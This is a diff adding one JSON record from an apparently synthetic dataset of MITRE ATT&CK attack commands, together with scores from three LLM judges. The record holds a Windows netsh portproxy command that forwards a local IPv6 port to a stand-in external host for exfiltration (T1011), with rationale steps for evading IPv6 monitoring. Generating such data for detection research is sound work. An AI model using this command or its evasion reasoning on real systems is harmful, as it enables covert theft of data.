@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "netsh interface portproxy add v6tov6 listenaddress=::1 listenport=49601 connectaddress=2001:db8:4444::1 connectport=49602",
+  "explanation": "Establishes a v6-to-v6 port proxy over IPv6-only uncommon ports to move data via IPv6 directly, leveraging an alternate medium for exfiltration (T1011).",
+  "rationale_steps": [
+    "Set an IPv6 loopback listener that forwards to an external IPv6 host.",
+    "Operate exclusively over IPv6 to exploit gaps in IPv6 monitoring.",
+    "Use high ports (49601/49602) to stay away from well-known services."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-9788b456-eec7521a",
+  "source_prompt_hash": "9788b456",
+  "timestamp_utc": "2025-09-30T08:11:11.119466Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Valid netsh portproxy v6tov6 syntax with correctly formed parameters and no quoting or flag issues.",
+        "semantic_score": 3,
+        "semantic_justification": "It sets up an IPv6 TCP port forward that could facilitate data exfiltration, but it is not automation by itself and requires administrator privileges despite claiming 'Privilege: None'.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T03:01:03.250716Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct syntax for the netsh interface portproxy add command, including all required parameters with proper format and no syntax errors.",
+        "semantic_score": 4,
+        "semantic_justification": "The command correctly establishes an IPv6-to-IPv6 port proxy that could be used for automated exfiltration, though the destination address (2001:db8:4444::1) is a documentation prefix rather than a real routable address, slightly reducing operational plausibility.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T03:01:06.294758Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, uses valid flags and syntax for the 'netsh interface portproxy' utility, and has no parsing errors.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command correctly sets up a port proxy that could facilitate exfiltration via an alternate medium, the stated 'Privilege: None' is incorrect as 'netsh interface portproxy add' requires Administrator privileges, significantly impacting operational plausibility.",
+        "combined_score": 4.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T05:37:31.638209Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.333,
+    "llm_average_score": 4.167,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
